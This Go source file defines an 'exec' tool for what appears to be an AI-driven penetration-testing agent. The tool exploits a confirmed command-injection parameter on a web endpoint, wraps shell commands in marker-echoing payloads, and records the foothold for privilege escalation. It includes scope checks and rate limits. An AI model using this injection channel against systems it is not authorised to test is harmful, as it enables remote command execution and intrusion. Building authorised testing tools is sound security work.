package tools

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	core "github.com/cubyte-nl/agent-core/tools"

	"mole/internal/ledger"
	"mole/internal/scope"
)

// execOutputCap caps the output returned to the model (8 KB, like
// http_request).
const execOutputCap = 8192

// execCommandCap bounds a single command: long enough for any
// enumeration one-liner, short enough to keep URLs and form bodies sane.
const execCommandCap = 1024

// execVector is the registered command-execution channel: where the command
// is injected (url, method, param, separator, optional value prefix and
// headers). Commands run only on the target through this vector — the
// harness itself never executes them.
type execVector struct {
	method    string
	param     string
	separator string
	value     string
	fields    map[string]string
	headers   map[string]string
	url       *url.URL
	host      string
	port      int
}

// Exec runs shell commands on an in-scope target through a registered
// command-execution vector (typically a confirmed command-injection input).
// It is stateful per run: a call that passes url/param/separator registers
// the vector and verifies it with 'id'; the vector is fixed only once
// verification succeeds, so a failed registration (e.g. an endpoint that
// needs an authenticated session) can be retried. Every later call needs
// only 'command'. The vector host is scope-gated and rate-limited (shared
// with the other web tools) on every call.
type Exec struct {
	L   *ledger.Ledger
	mu  sync.Mutex
	vec *execVector
}

func (*Exec) Name() string   { return "exec" }
func (*Exec) Mutating() bool { return true }

func (*Exec) Description() string {
	return "Run a shell command on an in-scope target through a registered command-execution vector (e.g. a confirmed command-injection input). " +
		"First call: pass the vector — url, method (GET/POST, default POST), param (the injectable parameter), separator (shell separator such as ';'), " +
		"optionally value (prefix placed before the separator, e.g. '127.0.0.1'), a fields object (extra form fields the endpoint requires, e.g. a submit button), and a headers object — plus command (defaults to 'id'), which verifies the vector. " +
		"The vector is fixed only when verification finds its markers; if not (e.g. the endpoint needs an authenticated session cookie), re-call with the corrected vector. " +
		"Every later call: command only, the stored vector is reused (timeout in seconds, default 30, max 60). " +
		"Commands execute on the target, never in the harness; output is extracted from between echoed markers. " +
		"Use it once a foothold lands to work through the privilege-escalation checklist — minimal, non-destructive commands."
}

func (*Exec) Parameters() map[string]any {
	return map[string]any{
		"type": "object",
		"properties": map[string]any{
			"command": map[string]any{
				"type":        "string",
				"description": "Shell command to run on the target. First call defaults to 'id' (verification); later calls require it.",
			},
			"url": map[string]any{
				"type":        "string",
				"description": "First call only: the in-scope URL of the vulnerable endpoint, e.g. 'http://host:port/vulnerabilities/exec/'.",
			},
			"method": map[string]any{
				"type":        "string",
				"description": "First call only: HTTP method of the endpoint, GET or POST (default POST).",
			},
			"param": map[string]any{
				"type":        "string",
				"description": "First call only: name of the injectable request parameter.",
			},
			"separator": map[string]any{
				"type":        "string",
				"description": "First call only: shell separator between the existing input and your command, e.g. ';' or '&&'.",
			},
			"value": map[string]any{
				"type":        "string",
				"description": "First call only, optional: prefix value placed before the separator (e.g. '127.0.0.1' for a ping field).",
			},
			"fields": map[string]any{
				"type":        "object",
				"description": "First call only, optional: extra form fields the endpoint needs besides the injectable param (e.g. the submit button value), keyed by field name.",
			},
			"headers": map[string]any{
				"type":        "object",
				"description": "First call only, optional: extra request headers (e.g. a session Cookie) keyed by header name.",
			},
			"timeout": map[string]any{
				"type":        "integer",
				"description": "Optional: per-command timeout in seconds (default 30, capped at 60).",
			},
		},
		"required": []string{},
	}
}

// execTimeout maps a seconds argument to a clamped timeout: default 30 s,
// max 60 s.
func execTimeout(seconds int) time.Duration {
	if seconds <= 0 {
		return 30 * time.Second
	}
	d := time.Duration(seconds) * time.Second
	if d > 60*time.Second {
		d = 60 * time.Second
	}
	return d
}

// execToken is a random hex token for the output markers.
func execToken() (string, error) {
	var b [8]byte
	if _, err := rand.Read(b[:]); err != nil {
		return "", err
	}
	return hex.EncodeToString(b[:]), nil
}

// extractMarked cuts the text between the echoed markers; "" when either
// marker is missing.
func extractMarked(text, begin, end string) string {
	i := strings.Index(text, begin)
	if i < 0 {
		return ""
	}
	i += len(begin)
	j := strings.Index(text[i:], end)
	if j < 0 {
		return ""
	}
	return strings.TrimSpace(text[i : i+j])
}

// newExecRequest builds the request carrying the marker-wrapped payload:
// form-encoded for POST, query string for GET.
func newExecRequest(v execVector, payload string) (*http.Request, error) {
	target := v.url
	var req *http.Request
	var err error
	if v.method == http.MethodPost {
		body := url.Values{}
		body.Set(v.param, payload)
		for k, val := range v.fields {
			body.Set(k, val)
		}
		req, err = http.NewRequest(http.MethodPost, target.String(), strings.NewReader(body.Encode()))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		q := target.Query()
		q.Set(v.param, payload)
		target.RawQuery = q.Encode()
		req, err = http.NewRequest(http.MethodGet, target.String(), nil)
		if err != nil {
			return nil, err
		}
	}
	for k, val := range v.headers {
		req.Header.Set(k, val)
	}
	return req, nil
}

func (e *Exec) Run(ctx context.Context, s *scope.Scope, args map[string]any) core.Result {
	const name = "exec"
	e.mu.Lock()
	defer e.mu.Unlock()

	cmd := strArg(args, "command")
	var vec execVector
	register := false
	if e.vec != nil {
		vec = *e.vec
	} else {
		register = true
		method := strings.ToUpper(strArg(args, "method"))
		if method == "" {
			method = http.MethodPost
		}
		if method != http.MethodGet && method != http.MethodPost {
			return core.Result{Tool: name, Allowed: false, Reason: "exec: method must be GET or POST"}
		}
		param, sep := strArg(args, "param"), strArg(args, "separator")
		if param == "" || sep == "" || strArg(args, "url") == "" {
			return core.Result{Tool: name, Allowed: false,
				Reason: "exec: first call needs the vector — url, param, separator (plus optional method, value, headers); command defaults to 'id'"}
		}
		parsed, host, port, err := parseProbeURL(strArg(args, "url"))
		if err != nil {
			return core.Result{Tool: name, Allowed: false, Reason: "exec: " + err.Error()}
		}
		if cmd == "" {
			cmd = "id"
		}
		vec = execVector{method: method, param: param, separator: sep,
			value: strArg(args, "value"), fields: stringMapArg(args, "fields"),
			headers: stringMapArg(args, "headers"), url: parsed, host: host, port: port}
	}
	if cmd == "" {
		return core.Result{Tool: name, Allowed: false, Reason: "exec: command is required"}
	}
	if len(cmd) > execCommandCap {
		return core.Result{Tool: name, Allowed: false, Reason: fmt.Sprintf("exec: command exceeds %d characters", execCommandCap)}
	}
	target := vec.url.String()

	// Scope gate on every call: the vector host must stay in scope, so a
	// runtime exclusion also stops a registered vector.
	ok, reason := s.CheckTarget(ctx, vec.host, &vec.port)
	if !ok {
		return core.Result{Tool: name, Target: target, Allowed: false, Reason: reason}
	}
	// Per-host rate limit, shared with the other web tools.
	if err := webLimiter.Wait(ctx, vec.host); err != nil {
		return core.Result{Tool: name, Target: target, Allowed: false, Reason: "exec: " + err.Error()}
	}

	timeout := execTimeout(intArg(args, "timeout", 0))
	rctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	tok, err := execToken()
	if err != nil {
		return core.Result{Tool: name, Target: target, Allowed: false, Reason: "exec: " + err.Error()}
	}
	markerB, markerE := "MOLE-"+tok+"-BEGIN", "MOLE-"+tok+"-END"
	// The command is wrapped in echoed markers so its output can be cut out
	// of the page the application renders around it.
	payload := vec.value + vec.separator + "echo " + markerB + "; " + cmd + " 2>&1; echo " + markerE

	req, err := newExecRequest(vec, payload)
	if err != nil {
		return core.Result{Tool: name, Target: target, Allowed: false, Reason: "exec: " + err.Error()}
	}
	resp, err := (&http.Client{Timeout: timeout}).Do(req.WithContext(rctx))
	if err != nil {
		return core.Result{Tool: name, Target: target, Allowed: false, Reason: "exec: request failed: " + err.Error()}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	text := string(body)

	out := extractMarked(text, markerB, markerE)
	pl := map[string]any{"command": cmd, "output": out, "status": resp.Status}
	res := core.Result{Tool: name, Target: target, Allowed: true}
	if out == "" {
		out = text
		if len(out) > execOutputCap {
			out = out[:execOutputCap]
		}
		pl["output"] = out
		res.Reason = "exec: no markers in the response — output may be filtered; returning the first " +
			strconv.Itoa(execOutputCap/1024) + " KB of the body"
		if register {
			// A vector that fails its own verification is not fixed: the
			// model can re-call exec with the corrected vector.
			res.Reason += "; vector NOT registered — re-call exec with the corrected vector (e.g. an authenticated session cookie)"
		}
	} else {
		if len(out) > execOutputCap {
			pl["output"] = out[:execOutputCap] + "…"
		}
		if register {
			e.vec = &vec
			pl["registered"] = "command-execution vector registered; later calls need command only"
			// Record the foothold in the ledger: the post-exploitation pivot
			// every later escalation step cites.
			if e.L != nil {
				ident := strings.TrimSpace(out)
				if i := strings.IndexByte(ident, '\n'); i > 0 {
					ident = ident[:i]
				}
				if f, err := e.L.Record(
					fmt.Sprintf("command execution on %s (running as %s)", vec.host, ident),
					target, name, out); err == nil && f != nil {
					pl["finding"] = f.ID
				}
			}
		}
	}
	if resp.StatusCode >= 400 && res.Reason == "" {
		res.Reason = "exec: target responded " + resp.Status
	}
	res.Payload = pl
	return res
}
